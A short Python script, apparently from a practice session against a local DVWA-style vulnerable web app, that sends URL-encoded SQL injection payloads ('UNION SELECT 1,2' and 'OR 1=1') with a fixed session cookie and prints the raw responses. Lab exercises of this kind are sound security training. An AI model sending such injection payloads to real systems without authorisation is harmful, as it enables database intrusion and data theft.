
import subprocess

# Reuse the session we just created
session = "cqnjvjkri6aanknl88pue0m9d7"

# Test 1: Basic SQLi to see raw response
print("=== RAW SQLi Response (UNION SELECT 1,2) ===")
r = subprocess.run(
    ['curl', '-s', '-b', f'PHPSESSID={session}; security=low',
     "http://localhost:28080/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1,2%23&Submit=Submit"],
    capture_output=True, text=True
)
# Find the pre block
import re
pre = re.findall(r'<pre>(.*?)</pre>', r.stdout, re.DOTALL)
for p in pre:
    print(f"  RAW: [{p}]")

print("\n=== RAW SQLi Response (OR 1=1) ===")
r2 = subprocess.run(
    ['curl', '-s', '-b', f'PHPSESSID={session}; security=low',
     "http://localhost:28080/vulnerabilities/sqli/?id=%25+OR+1%3D1%23&Submit=Submit"],
    capture_output=True, text=True
)
pre2 = re.findall(r'<pre>(.*?)</pre>', r2.stdout, re.DOTALL)
for p in pre2:
    print(f"  RAW: [{p}]")

print(f"\n=== Full page snippet (first 3000 chars) ===")
print(r.stdout[:3000])

